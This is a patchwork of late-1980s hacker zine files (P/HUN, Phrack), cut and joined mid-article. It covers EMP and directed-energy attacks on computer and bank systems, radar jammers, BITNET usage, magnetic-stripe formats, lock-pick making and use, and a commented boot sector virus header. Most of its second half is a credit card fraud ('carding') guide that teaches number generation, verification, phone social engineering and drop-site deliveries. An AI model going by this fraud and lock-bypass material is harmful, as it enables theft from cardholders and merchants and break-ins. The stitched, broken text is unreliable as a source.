200.00 for an average rip-stop nylon camping backpack unit ) per man with
a recommended dispersal of 3 manpacks per unit into the theater.
Suspected effective ranging up to 3 miles per man pack unit is suggested.

Or even better, if such things were possible against military aircraft
or normal commerical real world autos, then directed intent should be
of now problem against civilian targets such as computer installations,
bank and operations support structures, possible override of security
systems and any other systems that may be affected by such forces.


Other uses of directed energy may be used in law enforcement situations
for the apperhension of suspected persons in late model automobiles.
If the truckers are using the radios for game playing, then why can't the
police have the same type of device for the stopping of autos? There are a
number of devices that will radiate such energies over the spectrum.
One such device would be the Radar Speed Gun Calibrator (or better know as
a radar jammer) for use with calibration of speed guns or for the
deceiving of police radar units. The plans for such units were (are)
available for a number of sources. One such source, is Philips Instrument
Company or another such source was the Radio-Electronics issue in the
spring or summer of 1987 with plans for the Radar Speed Gun Calibrator,
that would allow you to transmit a signal that would equal the same type
of reflected signal from an automobile traveling at the supposed testing
speed. Range's of speed signal output would equal 5 mph to well over
100 mph.

Some plans or kits come with instructions for the combination of radar
jammer units with most commonly available auto radar detector units.
In simple terms, the radar detector unit detects a signal and through
its display or attention getting circuitry in turn activates the radar
jamming equipment to deceive or jam the police transmitter / reciever
units. Best know of such combinations, were the use of Escort radar
detectors and jammer units with transmission horns mounted behind the
front grill of autos. No ifs, ands, or buts, they work!

One other piece of equipment that may have devastating effects on overall
security and support systems, deals with the generation of very high
energy pulses that might be classified as being able to generate EMP's
that could damage almost any piece of electronic gear. The claim from the
designer is that this device can generate a pulse with an effective range
of multi-millions of watts. The device on average will produce a pulse
equal to 400,00 wats in a testing mode with the multi-million outputs
available with full charging of the capacitor banks peaked. Also stated in
this book is the ability of the unit to produce a very large inductance in
near by electronic gear. Most interesting! And the only statement in this
book about the device and it's short comming, has to deal with the
in-ability of the device to produce sufficent output used in certain
nuclear experiments. I wonder what that means?

So, in closing, the capability of these units is well within the range of
any person with the intent comes closer to home than ever before.
The equipment is nothing of major technical wonderment, just a few simple
block circuits put together to each other so that they work together to do
the final requested product. And all of the described gear or plans may be
in the hands of everyday persons even if they don't know it! And while
most do not have such knowledge about how such systems may be used to
corrupt other systems, or even how the average telephone or toaster may
work, they will still state that such described technology is not
possible, and open the door to major disaster due to complete ignorance to
the problem. In closing, to steal a phrase from someone
else, "The truth shall set you free (or may keep you from being over
exposed from free form energy)!


"Click!"  And the last words spoken by the corporate DP offical were...

" Thats impossible! You could never do that to my operation!"

Ahem, Sure sir, Sure!

                          An introduction to BITNET
                          -------------------------

                               By Aristotle
                              Jan 17, 1989


         About BITNET:

              Because It's Time NET (BITNET) is the largest of the
         acedemic computer networks and one of the largest mainframe
         networks.  BITNET connects hundreds of thousands of students
         and professors in Asia, Europe, Middle East, and North
         America.  In 1988, BITNET had nearly 2000 computer systems at
         higher institutions connected to it.  BITNET may not allow
         you to log onto mainframes, BUT it IS an invaluable source of
         information.  While on BITNET, you can access certain
         services such as chat relays, file servers, electronic mail
         service, and info servers. (See below for more info)


         A little semi-technical info:
              The mainframes on BITNET are connected via constantly
         operating telephone lines or satellite links.  Unlike
         packet-switching networks (ie. Telenet), BITNET is a store
         and forward network.  That means that if you send a message
         from Florida to Kentucky, the computers in the network
         between Florida and Kentucky will store and forward it from
         each computer to computer until it reaches Kentucky.


              In BITNET there's only one path from Kentucky to
         Florida.  Each computer is called a NODE.  Below is an
         illustration of how a small section of the network would look
         like.



             A----B----C
             |    |    |
             D----E----F----G
             |         |    |
             H         I----J ---K


         Example A.
         A message traveling from A to H would travel the following
         path:
         A-D-H

         Example B.
         A message traveling from A to F could travel one of two ways.
         These are:
         A-B-C-F  or A-D-E-F

              Sometimes when a node is down, the message may be
         delayed or routed through different nodes as in example B.


              The time to transfer messages can vary from just a few
         seconds to an hour.  This cause for this is usually one (or
         both) of two reasons.  The first factor is the size of the
         message.  Larger amounts of data take longer times to
         transmit.  The second factor is the status of the network.
         As we all know, computers are prone to breaking down.
         Messages that cannot be routed past the downed node are
         stored in the net until there is a clear path to it's
         destination.


         Addresses:

              Each of the mainframes(NODE) on BITNET has it's own
         individual address.  The addresses are usually an
         abbreviation of the name of the institution that supports the
         mainframe.  One example is the University of Massachusettes
         "UMASS".


              The indiviuals that have access to BITNET also have
         their own addresses.  These addresses are assigned to the
         user when he/she first sends information over BITNET.  The
         entire address for a user is set up as follows:



         University of Kentucky Prime--+
                                       |
         @ (AT)----------------------+ |
                                     | |
         User ID-------------------+ | |
                                   | | |
                                   | | |
                                   | | |
                                   | | |
                                   | | |
                                 $108@UKPR

         Note: Not all addresses give indication of the type of
         system.
               Also: On some machines, the BITNET ID will be different
         from the system ID.  Ex. CS.DEPT.SMITH.J@UKPR is also
         $108@UKPR.



         Access:

              It is IMPOSSIBLE to access BITNET unless you can gain
         access to one of the nodes.  That means, there are NO
         dial-ups that do not go through a mainframe.  BITNET is
         supported by the institutions that have access to it and it
         is your right as a student to have access.  It is NOT your
         right to access the mainframe though.  A good way to gain
         access to BITNET is to go to your local university and ask or
         engineer an account for the use of BITNET.



         Uses:

              There are three basic methods of communicating via
         BITNET: mail, message, and file.  Each method has it's own
         advantages and disadvantages.


              The interactive message (Let's just call it a message)
         is the fastest and most convenient method of transitting
         short amounts of information over BITNET.  Messages are
         composed of one line of information that is sent VERY quickly
         to it's destination.  You would use the message when chatting
         with someone at a different node.  The bad part about
         messages is that if a node is down, your message is lost.
         You WILL recieve an error message though.

              Messages are usually sent via the TELL and SEND
         commands.  Below are examples of the syntax for sending a
         message on the VM/CMS and Prime systems:


         TELL userid@node message

         or

         TELL 151133@DOLUNI1 Hey Terra, How are the guys at CCC
         doing?


         Mail:

              Electronic mail is the most versatile method of
         communication on BITNET.  Unlike the message, a letter will
         be stored if a node is down.  A letter can be from one word
         of text to however long you want it.  It has been suggested
         to me to NOT transmit any mail over 3000 lines long (hmmm,
         maybe we should explore that one.)  The actual file that is
         transmitted is really nothing more than a formatted text file
         with a header.  When you send mail from you system,  You will
         be prompted to input a subject so the header can include the
         sending address, recieving address, date, and subject.  A
         piece of mail would look like this:


         Date:  Fri, 13 Jan 89 18:26:12 EDT
         From:  Terra <151133@DOLUNI1>
         Subject:  Greetings
         To:   $108@UKPR
         +
         =============================================================
         +  Hello Aristotle
         |
         |  Regarding the information that I have been recieving
         |  directed to a member of the
         |  Chaos Computer Club.......

                                        rest of text





         Files:

              The file is the best way to send large amounts of
         information over BITNET.  As with mail, files are stored
         until you read them or in the case of node being down, until
         they are back up.  Any type of file can be sent via a file.
         They can be either text or binary.  On a VM/CMS system, one
         would use the SHIP command to send a file over BITNET.  Below
         is an example:


         SHIP filename filetype userid@node

         or

         SHIP phun3 txt $108@UKPR

         I suggest that you check your online help for information on
         sending info over BITNET.

         Now for the phun part....

         FILE SERVERS, CHAT RELAYS, AND SERVICES:

              Servers are machines set up as automated databases for
         the distribution of various information.  Servers respond to
         commands via mail or message.  Not all use accept this type
         of communication.  It all depends on the type of software the
         server is running.  One would send a message to a server in
         the following syntax:


         TELL userid@node command

         or

         Tell listserve@bitnic help

              File servers are like servers but they are set up as
         databases that transmit files.  They are kinda like BBS's.
         The best way to get started with a file server is to send it
         the help command.


         A good place to start is the Listserv@Bitnic system.  It
         will send you all the information you will need to get
         started.

              Name servers have two functions.  The first is to locate a
         person's address on BITNET and the second is to help you find
         people on BITNET with similar interests.  (Hmmm, a hacker
         directory?)

         I suggest starting with the name server at Drew University.

         To find a particular person, just send the following to
         Drew:

         TELL NAMESERV@DREW SEARCH/NAME john doe

         If the person you are looking for is not registered, you will
         recieve a message informing you of that.

         To register yourself, send the following to Drew:

         TELL NAMESERV@DREW REGISTER first last interests

         or

         TELL NAMESERV@DREW REGISTER John Doe LMOS hacking


              A chat relay is set up to allow many users to chat with
         each other without having everyone sending messages to each
         other individually.  When on a relay, the people on your
         channel (be it public or private) will all see the messages
         that you send to them.  This is GREAT for phreaker
         conferences (Though it is NOT secure due to system operators)
         and just chatting with your friends over LONG distances.
         Geee and it is all legal too!  To find out more about relays,
         just send the following:


         TELL RELAY@UTCVM help

         If your local relay is not UTCVM, you will receive a message
         tell you that and also your correct relay.



              Well, that's it for this file. If you have any questions
         about BITNET, you can contact me at the following boards:

                PLASTIC CARD ENCODING PRACTICES AND STANDARDS
                ---------------------------------------------
                                By Hasan Ali
                             For P/HUN Issue #3


                   GENERAL PHYSICAL CHARACTERISTICS
                   --------------------------------

If you take any plastic card (MasterCard, VISA, AMEX, ATM cards, etc.) and
turn it over you will find a thin black strip of magnetic material.  This
strip has the ability to hold multiple "tracks" or bands of encoded data.
There are 3 valid tracks.  Track 1 is the track nearest to the top of the
card, and it is followed by Tracks 2 and 3.  The original specifications
allowed for Tracks 1 and 2 only, and they are both read-only.  The
additional Track 3 furnishes an ability to read OR write.


                               TRACK 1


The International Airlines Transport Association originated the development
of Track 1 as the official track airline use and, in fact, it defined the
data and encoding formats for the ANSI standard.  This track was originally
designed to allow the use of customer-operated ticket dispensing machines
to cut down the traffic at airport ticket counters.

Now, many other parties make use of Track 1 because it is the only encoded
track that permits encoding of the card holder's name.  With this alphanumeric
capacity, the card holder's name can be printed on an EFT terminal receipt
rather cheaply, otherwise the name would have to be sent the computer, which
would be more costly and would take more time.

There are 26 formats for Track 1, and they are designated by codes from "A" to
"Z".  Format "B" is shown below.

Field Name                                        Length(chars)

Start sentinel                                        1
Format code = "B"                                1 (alpha only)
Primary account number                                Up to 19
Separator (SEP)                                        1
Country code                                        3
Name                                                2 to 26
        Surname
        Surname SEP = "/"
        First name or initial
        Space (when required)
        Middle name or initial
        Period (when followed by title)
        Title (when used)
SEP                                                1
Expiration date or SEP                                4 or 1
Discretionary data                                balance up to maximum
                                                track length
End sentinel                                        1
Longitudinal Redundancy Check (LRC)                1

MAXIMUM TRACK LENGTH                                79

Format code "A" is reserved for proprietary use by the card issuer.  Format
codes "C" through "M" are reserved by ANSI for use in other data formats of
Track 1.  Format codes "N" through "Z" are available for use by individual
card issuers.


                               TRACK 2


The American Bankers Association led to the development of Track 2 on behalf
of two credit card companies (Interbank and VISA) and their members.  The
intent was to have a standardized plastic card which could be used at point-
of-sale (POS) terminals to obtain authorization for credit card transactions.

Today, in the financial industry, Track 2 is the most widely used encoding
method for plastic cards.  It has a strong following because most EFT
terminals are connected directly to a computer that accesses the cardholder's
data files.  Also, it is the preferred choice of the ABA and is the only track
recognized and supported by MasterCard and VISA.

The format of Track 2 is shown below.

You can call, or write, or if you can find a local locksmith supply house, they
may have copies available.
Note that the drawings, allthough detailed, are smaller than the actual tools,
but the size tends to be obvious.
NOTE:The correct size of a HPC pick handle is about 3 and 1/8 inches long.
If you have the the HPC drawings enlarged at a copy shop to just under 3x then
they will be of a useable size(If they can't do odd size enlargements, 3x
should be close enough.

B:MATERAL:Many materials are suitable for making picking tools/tension tools
1.Gutter broom bristles(those *BIG* trucks with the rotary brushes that wash
and sweep the street at the same time). Look for the bristles after the truck
leaves...generally at least a few break off...it is preferable to look near a
irregular spot of the road, as this tends to induce bristle breakage.
Also, depending on your area, you may find that smaller trucks are used along
with the larger ones...these generally use thinner bristles, which make better
picks, but many times, the thicker type makes better tension wrenches
NOTE:A Package of strips/round strips of spring steel can be obtained from a
locksmith supply house, but you will pay at least $18.00 for this!
NOTE:If you *really* to buy the tools..there 3 ways to go...
1.Try to order them through the mail..allthough the feds have been trying to
pass a bill prohibiting mailing picks, and door opening tools,  unless you can
prove you are a bona-fide locksmith(not as hard as you might think)..THIS BILL
HAS NOT PASSED AS OF YET. Also..the last time I checked am issue of HIGH TIMES
, there was a small advertisment in the back, and they had a pick set(for about
twice the price as the item's standard retail price.
2.Try to work for a store/shop that has a locksmiths license(*NOT* a keymakers
license).
Sooner or later they will ask you to pick up supplies..if the supplier has what
you need, then you can add the items to the order.
3.try and make friends with a locksmith..he can get you tools.

---------------
TOOLS REQUIRED:
---------------
If you are trying to make your own picks these tools are a good start...
1.A set of warding files(these are often available in the tool department of
large discount stores...For example, for people in NYC, a chain of stores
called Webers tends to have these at a good price.
While you can buy a set from a locksmith supply house, you will pay at least
 $20.00-$30.00 for a small set.
The discount store ones are generally $3.00-$5.00 a set.
While the quality is a bit lower, at least from my experience they do the job
ok.
2.A small propane or butane torch(if butane, one that can be refilled with a
can of cigarette lighter butane will be a lot cheaper to operate.
Note:a gas(but NOT a electric)kitchen stove burner will often do in a pinch.

------------------
HOW TO MAKE TOOLS:
------------------
First, let's assume that you are starting with gutter broom bristles, as they
are generally easy to get, and cost nothing..
First, let's start with a tension wrench...
Take a piece about 4-5 inches long, and make a sharp bend 1/4-1/2 inch from
the end(but DON'T make the bend so sharp that the strip cracks(if you want to
make a sharp bend, heat the strip at the point that you want to bend to red
heat and let it AIR COOL do not cool in fluid, as this will make the metal
harder!        After, if you want to reharden it, reheat, and plunge it into eit
oil or water(oil is better). If this results in the metal getting too hard,
then try cooling it a little slower. A book on metal working may be useful.
Also, if you want to make a complicated bend(a half twist, for example)then
heating the strip at the bend point will allow easy bending(this is one of
those times where a kitchen gas stove probably will not quite make it.


PICKS...You need pictures or drawings
(preferably full size).
Once you have these, select a piece of metal, soften about 2-3 inches using
a torch or gas burner, then get out your warding files and get to it!
NOTE:While in theory, you probably could file the strips without softening
them first, the metal is hardened, and resists being filed(this is also rough
on the files). What may help, whether you soften or not, is that a metal
nibbling tool can used for the rough shaping, and in some cases, can be used
to do most of the work. However you do it, it may be advisable to file the 2
flat sides of the tool(just a bit).


PART 5 USE OF TOOLS:
--------------------
The use of lockpicking tools is as much an art as it is a skill, but most
persons with enough practice can learn to do a decient job.

A good book on the subject comes from HPC(again)(Basic Picking and Raking.
This runs around $15.00), this is a bit overpriced, but a good guide.
But, let's go on......


Hand picks:
-----------
There are 4 different types of picks
The rake
The hook(this has other names as well)
The diamond
The ball/double ball(2 balls stacked)

The rake:
---------
The rake is prehaps the easiest tool to use, but it does not teach you much
about the lock you are working on;if this does not matter to you, then don't
worry about it. Hold the cylinder or padlock in a upright position(the way
it normally be mounted). The pins should be on the top.
Hold the pick with the more prominent wiggly side up(the hollow side down).
Tilt the back of the handle downward a bit;the wiggly part should be
horizontal. Now put it down for a minute, and pick up a tension wrench(L shaped
piece), and insert the shorter bent end into the bottom of the keyway.
Now..
Rotate the wrench in the direction that the lock normally rotates to open-if
not sure-pick a direction.
Then..hold the pick so that the handle is angled towards you slightly;at this
angle the curved part should be horizontal. Insert the pick into the lock all
of the way into the keyway, and making sure that contact is attained with the
pins. Draw it out..repeat until lock is open. But..don't push the pins up by
forcing the pick upward with great force...not only will this not open the
lock, but you will bend the pick as well.
If it does not open:
First, release the tension(you should hear the pins drop).
1.Try less(or more)tension on the tension wrench(NOTE:most problems are caused
 by too much tension).
2.Try holding the pick at a slightly different angle and/or height.
3.Try picking the lock in the other direction.

The hook:
---------
The hook is used to lift individual pins in a cylinder.
The tension wrench is inserted and rotated the same way as above.
After putting tension on the wrench, insert the hook into the keyway with the
hook upward. Then, starting from the rearmost pins, lift each pin.
To do this:Lift the pin until you feel a bump, or a "click", or a change in
the spring action of the pin then STOP and go to the next pin.
Continue this until the lock opens.
If it does not open release the tension then:
1.Try with more or less tension(NOTE:usually the problem is too much tension,
  so try lowering it first).
2.Try starting from the front pins, instead of the back ones.
3.Try picking the lock in the other direction.

The diamond:
------------
This tool is used the same way as the rake, as it is a modified rake design,
although it does not look the same.

The ball/double ball:
---------------------
These tools are mainly used for picking wafer tumbler locks.
They are used the same way as the rake, except these locks open *so* easily,
that you probably won't have to worry about the lock not opening.
NOTE:these locks can often be open in a pinch by using a bent paper clip(rake
the wafers and rotate the clip at the same time)

PICK GUNS:
----------
The most difficult part about using a pick gun is not using it, but getting the
damm thing in the first place. They are available from most of the same places
that hand picks are sold, but unlike hand picks, are not readily made at home.
If you manage to get one(the best one, at least in my opinion, is the LOCKAID.
This pick is made by a company called majestic.
It is made very well, has an ajustable strike force dial, and has a LIFETIME
warranty!

Well, let's assume you have one of these tools...
Well the first thing is to get a lock(a small padlock is a good practice item)
then...
1.insert the tension wrench at the bottom of the keyway, and rotate it in the
 direction that the lock opens.
2.starting with the pick gun's tension dial set either to 0 or 1(0=the point
 that the dial will go no lower)(1=1 full turn in the opposite direction), take
 the pick gun and insert it's needle into the keyway, but try not to insert it
 beyond the pins, as the needle may bind. Holding the tool horizontal, squeeze
 the trigger. Do this 6-8 times, if no results then release the tension(on the
 cylinder), raise the pick gun's tension dial 1 full turn, and try to open the
 lock again. Keep trying until you get it open.


TUBULAR LOCK PICKS:
-------------------

The best guide to using a tubular lock pick, is the instructions that come with
it. However, as these may not be available, these general notes will get you
started. Also HPC has a tutorial on using tubular lock picks(Basic Picking and
Servicing Tubular Locks) (a bit costly, but if it is as good as other HPC
tutorials I've seen, it may be worth it).

GENERAL INSTRUCTIONS:
---------------------

1. Take the pick and slide the feelers(the moveable tines) back and forth a few
 times. Slide all of them (usually 7) out past the end of the tool a bit(maybe
 1/8th of a inch or so). Then press the tool aginst a hard surface until all of
 the feelers are flush with the end of the tool.
2.Insert the tool into the front of the lock and gently push it all of the way
 into the lock.
 Then rotate the tool in the direction required for opening, but use a minimum
 of force, as excessive force will cause 2 difficulties:
1.The front of the pick may be damaged.
2.The lock may not be able to be open at all, or if it can it may be damaged.
After rotating the pick, slowly pump it in and out of the lock but note that
the pick should only be backed out about 1/8 inch or so.
Keep doing this;eventually the lock should open.
If not...start again from the start.

Introduction:

-------------

Welcome once again to another exiciting issue of P/HUN Magazine.



We are little behind schedule. The delay was caused by a severe disk crash

which wiped out most of the files. The whole issue had to be put back together

again.



This time we have a special segment called P/HUN Telecom News/Advancements,

which contains the latest news in the telecommunications industry as we know

today. This segment will be released on a regular basis. I would like to thank

DareDevil for taking the first shot it. We would appreciate some feedback on

this new concept.



If you have any articles to contribute please get in touch with us at our

BBS or at our Usenet address.

                         The Banishment Of Phrack Inc.

                               -----------------------------

                              by Knight Lightning



                        June 27, 1989 - August 28, 1989



Hello.  This message is being sent to all members of the Phrack Inc. Mailing

List to forewarn you of things to come.  Due to certain policies at the

University Of Missouri - Columbia (UMCVMB), Taran King and I will lose our

Bitnet/Internet accounts on June 27, 1989.  I would advise not sending files or

mail to either of our address after June 26, 1989 just to be safe.



Our "exile" from UMCVMB will last until August 28, 1989 when fall classes

begin.  However, this does not mean we are putting Phrack Inc. on hold by any

means.



Solution:  Anyone who has files to be placed in Phrack Inc. after June 26, 1989

should contact HATCHET MOLLY.  He can be reached at "TK0GRM2@NIU.BITNET" or

"TK0GRM2%NIU.BITNET@CUNYVM.CUNY.EDU".  He will be handling the gathering of

files from you... our network friends.



Phrack Inc. Newsletter Issue 27 will be released within the next TWO WEEKS.  If

you would like to receive this issue, please let me know as soon as possible.

The reason I make mention of this is because many people on the mailing list

are not currently accessing their work station for a variety of reasons

(school's out, on vacation, etc).  So let us know and we will send it to you

when we release it.



The situation with our Bitnet/Internet addresses will not affect SummerCon '89

in any way.  However, any issues of Phrack Inc. that we do release between June

27, 1989 and August 28, 1989 will *NOT* be sent over the networks to you until

September 1989.  Taran King and I will not have access to the network and will

have no way to send these files until then.  So it looks like bulletin boards

and software pirates will get first look during this time period.



So if you have any further questions about this situation, mail us right away.

Remember, any comments or information for Phrack Inc. after June 26, 1989

should be directed to Hatchet Molly.

                             A BOOT SECTOR VIRUS

                                 5/15/89





The following is a disassembled and commented version of the Alemeda

College Boot infector virus.  Courtesy of Southern Cross.





;-----------------------------------------------------------------------;

; This virus is of the "FLOPPY ONLY" variety.                           ;

; It replicates to the boot sector of a floppy disk and when it gains control

; it will move itself to upper memory.  It redirects the keyboard       ;

; interrupt (INT 09H) to look for ALT-CTRL-DEL sequences at which time  ;

; it will attempt to infect any floppy it finds in drive A:.            ;

; It keeps the real boot sector at track 39, sector 8, head 0           ;

; It does not map this sector bad in the fat (unlike the Pakistani Brain)

; and should that area be used by a file, the virus                     ;

; will die.  It also contains no anti detection mechanisms as does the  ;

; BRAIN virus.  It apparently uses head 0, sector 8 and not head 1      ;

; sector 9 because this is common to all floppy formats both single     ;

; sided and double sided.  It does not contain any malevolent TROJAN    ;

; HORSE code.  It does appear to contain a count of how many times it   ;

; has infected other diskettes although this is harmless and the count  ;

; is never accessed.                                                    ;

;                                                                       ;

; Things to note about this virus:                                      ;

; It can not only live through an ALT-CTRL-DEL reboot command, but this ;

; is its primary (only for that matter) means of reproduction to other  ;

; floppy diskettes.  The only way to remove it from an infected system  ;

; is to turn the machine off and reboot an uninfected copy of DOS.      ;

; It is even resident when no floppy is booted but BASIC is loaded      ;

; instead.  Then when ALT-CTRL-DEL is pressed from inside of BASIC,     ;

; it activates and infectes the floppy from which the user is           ;

; attempting to boot.                                                   ;

;                                                                       ;

; Also note that because of the POP CS command to pass control to       ;

; its self in upper memory, this virus does not to work on 80286        ;

; machines (because this is not a valid 80286 instruction).             ;

the society we live in.

I. Card Types



     The first digit of the credit card number (henceforth referred to as CCN)

determines the credit card type. A simple list might be:



         First Digit of Credit Card              Card Type

         --------------------------              ---------



                   3                          American Express

                   4                                Visa

                   5                             Mastercard

                   6                              Discover







II. Bank and Branch Numbers



                                   Sample Credit Card: 1234 567 890 123

                                                         ^

                                                         |

     Within the first group of numbers from the left [called Group 4] the Bank

name and branch are contained. We have already discovered that the first digit

of Group 4 reveals the card type. We will now look at how to decipher which

bank issued the card, and which branch of the bank the actual card holder banks

at. Look at the Second, Third, and Fourth digits of Group 4. These three

numbers tell which bank issued the card. A small list follows this paragraph,

although you can compile a list by yourself. Just glance at cards you get your

hands on which the bank name is printed, and record the information. [ Editor's

Note: This is a hard concept to explain, so let me give you an example. Lets

say Bank of Hicksville's group 4 Visa Credit Card reads 4560. (560 = Bank of

Hicksville). BUT, 4561 is NOT necessarily Bank of Hicksville, too. 4561 could

be Bank of Booniesville. So what I am trying to get across is that the next

bank in line doesn't HAVE to be 4570 -- it could be earlier in numbers. ]

III. Bank Codes [ International Bank or Interlink Numbers]



     These are used in checking credit. Later on, you will learn that while

checking the credit cards for the amount of credit, you will be prompted to

enter the Bank ID along with the Merchant ID. The bank IDs are, I believe, from

the following list. One note-- you cannot just choose any Bank ID and use it

with any merchant ID. They must correspond in some way. How, I don't know. I

THINK that a bank issues a merchant number to each of their customers. If you

try to use a merchant number with a bank number, and the merchant doesn't

actually use the bank that is specified by the bank number, you are going to

get some problems. (ie, the verification won't go through.) Again, I will state

that this is only a theory. The reason that I post this theory is to get minds

working. So far, no one has mentioned their ideas on the function of Bank

Codes. If you do happen to find out the true meaning of these numbers, please

get in touch with me so I can update this list. Thanks. One word- on VISA

credit cards, the bank IDs are the first 4 digits of the Card. For Mastercards,

however, they vary. A list follows:

IV. "Group 3"



Sample Credit Card: 1234 5678 9012 3456

                           ^

                           |

                           |

                         Group 3, or the second group on a credit card in from

the left, contains some VERY useful information about the card. This group

holds the information on the Maximum Expiration Date and the Maximum Credit

Limit. (I believe that you can all see the benefits of this.) This does not

mean, however, that the ACTUAL expiration date and ACTUAL credit limit are in

this group. What it means is this: When the different Credit Card Companies

issue Credit Cards to the consumer, he of course has a credit limit. And when

the Companies formulate credit cards, they create certain groups for certain

customers. That is, certain "groups" contain all the credit cards for people

with a credit limit between $x and $y. The same thing goes with the expiration

dates. Everyone whose card expires after m1/y1 and before m2/y2 has their

credit card in a certain group formulated by the company. For example:

My name is Joe Schmoe. My Visa credit card expires in January of the year 1999.

My credit limit on this card is $7,000. My credit card number (CCN) will

probably be in the same group as my brother-in-law Jack Koff whose card expires

in December of 1998 and whose credit limit is $6,000. BUT, our cards will be in

different groups entirely than my boss' whose card expires in June of 1995 and

whose credit limit is $40,000.

     Back to the point of section IV: Lets say you have a credit card with a

known expiration date and known credit limit. Lets also say that you happen

upon ANOTHER credit card whose numbers are the same up until the last 2 groups.

(You and I see that these two cards were issued by the same bank and PROBABLY

have a credit limit in the same ball park and an expiration date not far from

each other. ) BUT, even though you have this new credit card, you lost the

expiration date and credit limit. GOSH! How are you going to use this card when

you don't know this information?? APROXIMATE! You have a general idea now, and

you can go from there.

     One warning here: I have found that small groups of cards with high credit

limits are often hidden in between large groups of cards with very low credit

limits. For instance, lets look at this card: 4123 4567 8901 2345. From -4567

until 4600 in group 3 (from the right) gold cards may exist. But after 4600 and

before 4567, cards with credit limits of $500 exist. Kind of sucks, huh?? Just

wanted to make you aware of this.

     Now, once you learn how to modify these without hurting the card, you have

increased your value as a carder by 100x. But be careful. Often when you modify

a card's group 3 to get a higher credit limit line of cards, you will find the

entire line is dead. Or, in other cases, just the original card you find is

dead, and all surrounding cards are valid with the new credit limits.



V. "Group 2" & "Group 1"



     These two groups, or the last two groups on the credit card, are the

easiest to modify. By changing these in such a way, you can formulate new

credit cards simply by doing a little math in your head. These two groups

contain the IDentification codes. Later on in your carding careers, you might

find out how to change these, and thus, you have found the secret to a vault of

new and awaiting credit cards. I stress here that the only purpose that these

two groups serve is to differentiate between customers. If the first two groups

of two cards are the same and the last two groups of two cards are different,

the two cards were issued by the same bank and probably have similar credit

limits, but are of course issued to different people.



VI. Credit Card Verification



     Once you have a newly formulated or newly found Credit Card, you must

first check to see if it is valid before you distribute or use it. The reason

for this is this: Although you may not have faltered in your calculations, and

you created a credit card following the correct formula, the card may turn up

as invalid. This is because it has not been issued yet. Visa or Mastercard has

not issued that card to a customer yet. You are ahead of the credit card

company. (Don't you feel important??!) If this case arises, simply formulate a

new credit card from the original valid credit card, and check it once again.

There is no known way around this except to wait.

     OKAY- you want to check your credit card and see how much money this

person has. There are many, many credit verifiers around. The easiest way to

get ahold of one is to go into any store which accepts credit cards and look on

the side of the machine that imprints the carbons with the credit card number,

etc. Or, look right on the wall next to the register. There should be a number

to call, a merchant number, and perhaps a bank number. Jot these down and head

on home. The format for these is usually different, but all have the basic idea

in mind. Call an operator of some sort, tell her the authorization information

that she asks for (bank number,merchant number, etc)  and give her the card and

the amount for which to verify the card. She will check and let you know if it

has enough credit left. Simple. BUT***



 ******************* ONE NOTE **********************

 When you check a card for a certain amount of money, that amount of money is

subtracted from the amount available on the card. For example, if a card has

$5,000 left on it, and you get ahold of it and check it for $2,000, you can

only spend $3,000 before it tells you that you don't have the necessary credit

to go through with a transaction.



VII. Purchasing Merchandise: The Real Story



     OKAY, now that you have a VALID credit card, you will most likely want to

get some newly acquired merchandise. This is all fine and dandy, but if you

don't know what you are doing, you can get yourself and most likely your

friends in a LOT of trouble.





---------------------------------------------------------------------------

*** WARNING : NEVER ORDER SOMETHING FROM YOUR HOUSE. ALWAYS GO OUT TO A ***

*** PAY PHONE. ALSO, ALWAYS HAVE A STORY WORKED OUT BEFORE YOU CALL.    ***

*** THAT IS, YOUR NAME, ADDRESS, JOB, PHONE NUMBER, EXCUSE FOR NOT BEING***

*** HOME, MOTHER'S MAIDEN NAME, ETC. ANY STUTTERING OR HESITATION COULD ***

*** BLOW THE WHOLE SHOW !!!  !!!  !!!  !!!  !!!  !!!  !!!  !!!  !!!  !!!***

---------------------------------------------------------------------------





  FIRST- Let me clarify something. When you order something over the phone, and

the person selling you the items wants to know the actual Cardholder's name,

address, phone number, etc, you DO NOT have to give him/her the correct

information. [UNLESS: You do have to give the person correct information if

they have an online connection to a credit record bureau such as CBI or TRW. In

this case, as they can verify everything that you say in a matter of moments,

just do your best, get a new card, and never order from this company again. I

will not lie to you: some companies do have this capability. But if you stick

with little bussinesses who need your money, you'll do fine. ] Bullshit your

way through. Or hire a social engineer to do it for you. You do not even have

to give the correct expiration date! Almost Any expiration date will work as

long as it is at least one month ahead of the current month and it is not TOO

far ahead in time so that it jumped over the actual expiration date. (ie, if

the current date is 10/89, give the expiration date 11/89 -- simple) The

company from which you are buying things can not verify the extra information

YOU give them until after the order has been processed and the package shipped.

They have to get in touch with a Credit Union, which will be discussed later on

in this summary, to verify it all. * ALL THAT THEY CAN VERIFY PRONTO IS THAT

THE CREDIT CARD IS VALID, AND THAT IT HAS ENOUGH CREDIT TO PAY FOR THE

MERCHANDISE YOU ARE PURCHASING. * My suggestion, however, is that you give them

the phone number of a pay phone near your house. [ Or, if you want to REALLY

make sure things go smoothly, give them the number of a direct dial VMB local

to the shipping address. ] If they want to call you back, FINE. Ask them to do

so between the hours of X pm and Y pm. And, just pitch tent at the phone for a

few hours a night. No problem. They will almost always call right back, since

they don't want to inconvenience their customer who happens to be buying $6,000

worth of computers at the time. Understand?



  SECOND- Where should I ask have them ship it to, you ask? Fret not, my little

friend in carding. Before you call and order your things, first go out and find

an abandoned house. These still work best. Either one that has been moved out

of, and no one has moved into yet. Or, if you can, find one that is REALLY

abandoned. (BUT MAKE SURE IT HAS A STREET ADDRESS THAT THE POSTMAN OR UPS MAN

CAN FIND!) Jot down this address. This is referred to as a drop site.

[ Ed. Note: if, and I say IF you can rent a mailbox, do so. Make sure they sign

for everything (UPS, etc) and bring some FAKE ID with you to open it up. Most

of the time, they will give you hastle, and verify EVERYTHING you give them. So

it is really not that easy to get one of these. At least try, though. ] OKAY,

give this address to the man or lady who is taking your order. Tell them this

is where you live. REMEMBER, they can not verify that you don't live there for

quite a while. They will send everything there. When the shipment comes (either

Overnight, Second Day, or whenever), pick it up (CASUALLY) and stroll home to

open your package. If it does not come, or if the salesperson gives you

trouble, don't worry. If it didn't come, it is because 1) It got intercepted by

the feds or 2) The company didn't process it because they did actually try to

verify your address, name, and phone number, thus delaying your shipment, but

saving themselves a lot of money. Just try another store until you find some

place that is easy to buy from.



  THIRD- I suggest that you do not furnish your household with carded items. It

is just not wise. Get a few things, if you like, and wait a little while. Sit

tight. When things cool down, you might want to get some more things. REMEMBER-

all things are good in proportion, but when you get out of that proportion (ie,

get greedy and order a new house) you will most definately get caught sometime

or another. Patience is the carder's best friend. (along, of course, with the

VISA formula... hehe)



  FOURTH- You have all heard it before. DON'T DISPLAY YOUR SPEICAL TALENT AT

